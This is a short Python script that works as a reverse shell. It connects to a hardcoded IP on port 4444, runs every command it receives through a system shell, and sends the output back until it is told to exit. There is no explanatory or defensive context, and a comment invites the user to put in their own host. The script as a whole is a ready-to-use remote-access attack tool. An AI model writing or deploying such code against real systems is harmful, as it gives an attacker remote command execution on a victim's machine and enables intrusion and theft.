import socket
import subprocess

HOST = '192.168.100.34'  # Change this to your desired host IP
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect all input to the shell and output back to the socket
while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout = output.stdout.read() + output.stderr.read()
    s.send(stdout)

s.close()
